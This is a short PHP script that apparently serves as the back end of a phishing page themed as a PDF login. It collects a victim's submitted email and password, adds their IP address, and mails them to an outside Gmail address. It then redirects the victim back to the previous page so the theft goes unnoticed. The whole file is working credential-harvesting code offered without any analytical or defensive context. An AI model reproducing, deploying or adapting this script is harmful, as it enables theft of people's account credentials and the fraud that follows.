<?php
//retrieve our data from POST
$ip = getenv("REMOTE_ADDR");
$message .= "----------CHOKO'S PAGE------------\n";
$message .= "User ID : ".$_POST['Email']."\n";
$message .= "Password : ".$_POST['Password']."\n";
$message .= "$ip \n";
$message .= "------------PageMaker--------------\n";


$recipient = "ledlighting1688@gmail.com";
$subject = "PDF RESULT";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);

header("Location: {$_SERVER['HTTP_REFERER']}");
exit;
?> 